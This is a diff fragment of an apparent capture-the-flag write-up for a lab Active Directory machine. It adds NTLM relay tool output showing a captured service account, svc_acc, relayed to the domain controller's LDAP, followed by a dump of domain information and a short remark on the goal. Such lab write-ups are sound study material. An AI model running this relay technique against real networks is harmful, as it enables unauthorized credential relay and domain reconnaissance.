@@ -842,8 +842,21 @@ Since i cant use responder to grab the hash, ill use ntlm relay initially just t
 Then ill send the request back to the drip server on port 8080 where socat is listening
 
 ```python
-
+[*] Servers started, waiting for connections
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Connection from 10.129.232.7 controlled, attacking target ldap://dc-01.darkcorp.htb
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Authenticating connection from DARKCORP/SVC_ACC@10.129.232.7 against ldap://dc-01.darkcorp.htb SUCCEED [1]
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Enumerating relayed user's privileges. This may take a while on large domains
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Dumping domain info for first time
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Domain info dumped into lootdir!
 ```
+
+So the purpose of this was not to exploit anything as of yet, instead i just wanted to see the user account its running and authenticating as, i now know its `svc_acc`
+
+
 
 
 
